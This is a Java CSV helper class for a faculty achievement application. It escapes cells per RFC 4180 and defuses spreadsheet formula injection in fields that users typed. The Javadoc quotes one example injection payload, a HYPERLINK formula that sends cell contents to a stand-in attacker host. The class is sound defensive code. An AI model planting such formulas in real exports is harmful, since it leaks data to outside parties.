package com.niet.facultyachievement.util;

/**
 * CSV helpers shared by every export in the application.
 *
 * <p>Extracted from {@code AchievementServiceImpl}, which had these rules inline
 * as private methods. Two exports writing their own escaper is how a codebase
 * ends up with one that quotes correctly and one that corrupts a title
 * containing a comma.
 */
public final class Csv {

    private Csv() {
    }

    /**
     * The three bytes that make Excel auto-detect UTF-8.
     *
     * <p>Without this, Excel on a Windows machine opens the file in the system
     * code page and every accented name and every ₹ turns to mojibake. This is
     * the same trick the existing achievement export has always used.
     */
    public static byte[] bom() {
        return new byte[]{(byte) 0xEF, (byte) 0xBB, (byte) 0xBF};
    }

    /**
     * Escapes one cell per RFC 4180: doubles any quote, and wraps the cell when
     * it contains a comma, a quote, or a line break.
     *
     * <p>{@code \r} is in the wrap condition as well as {@code \n}. A lone
     * carriage return inside an unquoted cell splits the record in some readers,
     * so it has to be quoted for the same reason a newline does.
     */
    public static String cell(String value) {
        if (value == null) return "";
        String escaped = value.replace("\"", "\"\"");
        if (escaped.contains(",") || escaped.contains("\"")
                || escaped.contains("\n") || escaped.contains("\r")) {
            return "\"" + escaped + "\"";
        }
        return escaped;
    }

    /**
     * Escapes a cell whose content came from user input, and additionally stops a
     * spreadsheet from treating it as a formula.
     *
     * <p><strong>Why this exists.</strong> Achievement titles, project names and
     * award citations are typed by faculty. Excel and LibreOffice evaluate any
     * cell beginning {@code =}, {@code +} or {@code @} as a formula, so a title
     * like {@code =HYPERLINK("http://attacker/?"&A1,"Click")} becomes live content
     * in the spreadsheet an administrator opens — the field is quoted correctly
     * by {@link #cell(String)} and still executes, because quoting is about
     * parsing the file, not about how the spreadsheet interprets the value
     * afterwards. Prefixing a single quote makes the spreadsheet read it as text.
     *
     * <p>A leading {@code -} is only neutralised when the value is not actually a
     * number, so a genuine negative figure stays numeric and sortable.
     */
    public static String textCell(String value) {
        return cell(neutralizeFormula(value));
    }

    static String neutralizeFormula(String value) {
        if (value == null || value.isEmpty()) return value;
        char first = value.charAt(0);
        if (first == '=' || first == '+' || first == '@' || first == '\t' || first == '\r') {
            return "'" + value;
        }
        if (first == '-' && !isNumber(value)) {
            return "'" + value;
        }
        return value;
    }

    private static boolean isNumber(String value) {
        try {
            new java.math.BigDecimal(value);
            return true;
        } catch (NumberFormatException e) {
            return false;
        }
    }
}
